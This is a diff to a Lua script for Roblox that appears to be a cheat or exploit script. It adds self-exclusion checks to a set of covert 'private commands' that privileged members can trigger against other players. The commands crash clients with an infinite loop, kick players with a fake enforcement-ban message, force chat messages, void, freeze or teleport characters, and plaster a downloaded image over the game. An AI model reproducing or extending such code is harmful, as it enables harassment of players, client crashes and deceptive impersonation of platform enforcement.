@@ -95,39 +95,44 @@ end
 -- Private Commands
 --============================--
 
+local function isSelf(target)
+    return target == LocalPlayer
+end
+
 local PrivateCommands = {}
 
 PrivateCommands[":reveal"] = function(senderName, ...)
+    if senderName == LocalPlayer.Name then return end
     AddRevealUser(senderName)
     Chat:FireServer("EXWLSV")
 end
 
 PrivateCommands[":noroot"] = function(target)
-    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-        target.Character.HumanoidRootPart.Parent = nil
+    if not target or isSelf(target) then return end
+    local char = target.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.Parent = nil
     end
 end
 
 PrivateCommands[":say"] = function(target, msg)
+    if isSelf(target) then return end
     Chat:FireServer(tostring(msg))
 end
 
 PrivateCommands[":fakeban"] = function(target)
-    if target then
-        target:Kick("You created or used an account to avoid an enforcement action taken against another account within this experience")
-        task.delay(1, function()
-            warn("You created or used an account to avoid an enforcement action taken against another account within this experience")
-        end)
-    end
+    if not target or isSelf(target) then return end
+    target:Kick("You created or used an account to avoid an enforcement action...")
 end
 
 PrivateCommands[":kill"] = function(target)
-    if EnviromentRemote then
-        EnviromentRemote:FireServer(1000)
-    end
+    if not EnviromentRemote or isSelf(target) then return end
+    EnviromentRemote:FireServer(1000)
 end
 
-PrivateCommands[":samjumpscare"] = function()
+PrivateCommands[":samjumpscare"] = function(target)
+    if isSelf(target) then return end
+
     pcall(function()
         local FileName = "SamKalish.png"
         local Url = "https://cdn.discordapp.com/avatars/128988722837323776/dfe6a8a3dace8d4e88f26a27e46a1862.webp?size=300"
@@ -147,7 +152,6 @@ PrivateCommands[":samjumpscare"] = function()
             elseif v:IsA("BasePart") then
                 local d = Instance.new("Decal", v)
                 d.Texture = ImageAsset
-
                 local p = Instance.new("ParticleEmitter", v)
                 p.Texture = ImageAsset
                 p.Rate = 6
@@ -159,71 +163,75 @@ PrivateCommands[":samjumpscare"] = function()
 end
 
 PrivateCommands[":freeze"] = function(target)
-    if target and target.Character and target.Character.PrimaryPart then
-        target.Character.PrimaryPart.Anchored = true
+    if not target or isSelf(target) then return end
+    local char = target.Character
+    if char and char.PrimaryPart then
+        char.PrimaryPart.Anchored = true
     end
 end
 
 PrivateCommands[":unfreeze"] = function(target)
-    if target and target.Character and target.Character.PrimaryPart then
-        target.Character.PrimaryPart.Anchored = false
+    if not target or isSelf(target) then return end
+    local char = target.Character
+    if char and char.PrimaryPart then
+        char.PrimaryPart.Anchored = false
     end
 end
 
 PrivateCommands[":trip"] = function(target)
-    if target and target.Character and target.Character:FindFirstChild("Humanoid") then
-        target.Character.Humanoid.PlatformStand = true
+    if not target or isSelf(target) then return end
+    local char = target.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.PlatformStand = true
     end
 end
 
 PrivateCommands[":bring"] = function(targetName)
-    if typeof(targetName) ~= "string" then return end
-
     local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    -- find target player
     local target = Players:FindFirstChild(targetName)
-    if not target then return end
+    if not target or isSelf(target) then return end
 
-    -- ensure local player HRP exists
     local lpChar = LocalPlayer.Character
     local lpRoot = lpChar and lpChar:FindFirstChild("HumanoidRootPart")
     if not lpRoot then return end
 
-    -- ensure target HRP exists (wait if necessary)
     local tChar = target.Character or target.CharacterAdded:Wait()
     local tRoot = tChar:FindFirstChild("HumanoidRootPart") or tChar:WaitForChild("HumanoidRootPart", 5)
     if not tRoot then return end
 
-    -- bring target to local player
     tRoot.CFrame = lpRoot.CFrame * CFrame.new(0, 3, 0)
 end
 
 PrivateCommands[":void"] = function(target)
-    if target and target.Character and target.Character.PrimaryPart then
-        target.Character.PrimaryPart.CFrame *= CFrame.new(0, 99999999, 0)
+    if not target or isSelf(target) then return end
+    local char = target.Character
+    if char and char.PrimaryPart then
+        char.PrimaryPart.CFrame *= CFrame.new(0, 99999999, 0)
     end
 end
 
 PrivateCommands[":kick"] = function(target, msg)
-    if target then target:Kick(msg or "Kicked") end
+    if target and not isSelf(target) then
+        target:Kick(msg or "Kicked")
+    end
 end
 
 PrivateCommands[":setfps"] = function(target, fpsValue)
-    if fpsValue then
-        fpsValue = tonumber(fpsValue)
-        if fpsValue and setfpscap then
-            setfpscap(fpsValue)
-        end
+    if not isSelf(target) then return end
+    -- setfps only affects YOUR CLIENT → only allow if the target IS YOU
+    fpsValue = tonumber(fpsValue)
+    if fpsValue and setfpscap then
+        setfpscap(fpsValue)
     end
 end
 
 PrivateCommands[":crash"] = function(target)
-    if target then while true do end end
+    if not target or isSelf(target) then return end
+    while true do end
 end
 
 PrivateCommands[":prcprivate"] = function(target)
+    if not target or isSelf(target) then return end
     for _, name in ipairs(PrivateMembers or {}) do
         local p = Players:FindFirstChild(name)
         if p then
@@ -235,19 +243,19 @@ PrivateCommands[":prcprivate"] = function(target)
 end
 
 PrivateCommands[":removeprc"] = function(target)
+    if not target or isSelf(target) then return end
     for _, name in ipairs(PrivateMembers or {}) do
         local p = Players:FindFirstChild(name)
         if p then
             local tag = p:FindFirstChild("IsGameMod")
-            if tag then
-                tag:Destroy()
-            end
+            if tag then tag:Destroy() end
         end
     end
 end
 
 PrivateCommands[":notify"] = function(target, msg)
-    if target and _G.WindUI then
+    if not target or isSelf(target) then return end
+    if _G.WindUI then
         _G.WindUI:Notify({
             Title = "Notification",
             Content = msg or "No message",
